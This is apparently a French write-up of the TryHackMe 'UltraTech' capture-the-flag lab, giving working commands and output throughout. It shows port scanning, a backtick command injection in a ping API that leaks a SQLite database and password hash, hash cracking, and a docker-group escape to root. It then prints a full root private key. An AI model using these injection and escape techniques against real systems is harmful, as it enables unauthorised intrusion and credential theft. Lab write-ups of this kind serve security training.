# UltraTech #

## Task 1 Deploy the machine ##

**Deploy the machine**

## Task 2 It's enumeration time! ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.110.218 ultratech.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A ultratech.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-18 21:42 CEST
Nmap scan report for ultratech.thm (10.10.110.218)
Host is up (0.072s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/18%OT=21%CT=1%CU=30194%PV=Y%DS=2%DC=T%G=Y%TM=611D632
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)SEQ(
OS:SP=100%GCD=1%ISR=107%TI=Z%II=I%TS=A)SEQ(SP=FF%GCD=1%ISR=107%TI=Z%CI=I%TS
OS:=A)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M
OS:506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68
OS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   32.71 ms 10.9.0.1
2   80.83 ms ultratech.thm (10.10.110.218)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.37 seconds

```

**Which software is using the port 8081?**

Sur le scan nmap sur le port 8081 on voit que le logiciel est Node.js.    

Réponse : Node.js    

**Which other non-standard port is used?**

Le port 31331 est nom standard pour le service HTTP.  

Réponse : 31331   

**Which software using this port?**

Le logiciel sur le port 31331 est Apache. 

Réponse : Apache  

**Which GNU/Linux distribution seems to be used?**

Sur Apache et OpenSSH, c'est des versions sur Ubuntu.   

Réponse : Ubuntu    

**The software using the port 8080 is a REST api, how many of its routes are used by the web application?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://ultratech.thm:8081/ -w /usr/share/dirb/wordlists/common.txt -q
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
```

On voit 2 répertoires.

La réponse est : 2 

## Task 3 Let the fun begin ##

**There is a database lying around, what is its filename?**

![page1](./Task1-01.thm)

Sur la page principale il y pas grand chose.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://ultratech.thm:31331/ -w /usr/share/dirb/wordlists/common.txt -q
/.hta                 (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 300]
/.htpasswd            (Status: 403) [Size: 300]
/css                  (Status: 301) [Size: 321] [--> http://ultratech.thm:31331/css/]
/favicon.ico          (Status: 200) [Size: 15086]                                    
/images               (Status: 301) [Size: 324] [--> http://ultratech.thm:31331/images/]
/index.html           (Status: 200) [Size: 6092]                                        
/javascript           (Status: 301) [Size: 328] [--> http://ultratech.thm:31331/javascript/]
/js                   (Status: 301) [Size: 320] [--> http://ultratech.thm:31331/js/]        
/robots.txt           (Status: 200) [Size: 53]                                              
/server-status        (Status: 403) [Size: 304]                                             
tim@kali:~/Bureau/tryhackme/write-up$ curl http://utlratech.thm:31331/robots.txt
curl: (6) Could not resolve host: utlratech.thm
tim@kali:~/Bureau/tryhackme/write-up$ curl http://ultratch.thm:31331/robots.txt
```

On remarque que site possède un fichier robots.txt.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://ultratech.thm:31331/robots.txt
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

Le fichier robots nous indique un fichier utech_sitemap.txt.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://ultratech.thm:31331/utech_sitemap.txt
/
/index.html
/what.html
/partners.html
```

Le fichier utech_sitemap.txt nous indique trois liens.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://ultratech.thm:31331/partners.html -s | tail
						<a href=""><h6 class="left-align" >Forgot your password?</h6></a>
					</form>
				</div>
			</div>
		</div>
	</div>
	<script src='js/app.min.js'></script>
	<script src='js/api.js'></script>
</body>
</html>
```

A la fin du fichier on trouve des scripts on regarde le fichier api.js.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://ultratech.thm:31331/js/api.js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

Dans le script il a y une ligne qui nous indique une variable que l'on peut passer.   
```text
const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
```

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://ultratech.thm:8081/ping?ip=10.9.228.66
PING 10.9.228.66 (10.9.228.66) 56(84) bytes of data.
64 bytes from 10.9.228.66: icmp_seq=1 ttl=63 time=33.0 ms

--- 10.9.228.66 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 33.096/33.096/33.096/0.000 ms
```

On met un adresse ip on voit qu'il a un retour.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://ultratech.thm:8081/ping?ip=\`ls\`
ping: utech.db.sqlite: Name or service not known
```

On a maintenant le nom du fichier. 

La réponse est : utech.db.sqlite 

**What is the first user's password hash?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://ultratech.thm:8081/ping?ip=\`cat%20utech.db.sqlite\`
���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
```

On obtient le hash.  

La réponse est : f357a0c52799563c7c7b76c1e7543a32    

**What is the password associated with this hash?**

```bash

tim@kali:~/Bureau/tryhackme/write-up$ hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt --quiet
f357a0c52799563c7c7b76c1e7543a32:n100906
```

On brute force le hash avec hashcat, on trouve le mot de passe.    

La réponse est : n100906 

## Task 4 The root of all evil ##

**What are the first 9 characters of the root user's private SSH key?**


```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://ultratech.thm:8081/auth?login=r00t%38password=n100906
You must specify a login and a passwordtim@kali:~/Bureau/tryhackme/write-up$ curl http://ultratech.thm:8081/auth?login=r00t\&password=n100906
<html>
<h1>Restricted area</h1>
<p>Hey r00t, can you please have a look at the server's configuration?<br/>
The intern did it and I don't really trust him.<br/>
Thanks!<br/><br/>
<i>lp1</i></p>

```

Il y a un message qui dit de regarder la configuration serveur.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh r00t@ultratech.thm
The authenticity of host 'ultratech.thm (10.10.110.218)' can't be established.
ECDSA key fingerprint is SHA256:RWpgXxl3MyUqAN4AHrH/ntrheh2UzgJMoGAPI+qmGEU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ultratech.thm,10.10.110.218' (ECDSA) to the list of known hosts.
r00t@ultratech.thm's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Aug 18 21:05:50 UTC 2021

  System load:  0.0                Processes:           101
  Usage of /:   24.3% of 19.56GB   Users logged in:     0
  Memory usage: 71%                IP address for eth0: 10.10.110.218
  Swap usage:   0%


1 package can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
 
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

On remarque que l'on est dans un docker.   

```bash
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

On s'évade du docker en exécutant un bash.   

```bash
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# cd root
# cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
```

On obtient un shell root, on lit la clef privée dans le fichier id_rsa.    

La réponse est : MIIEogIBA     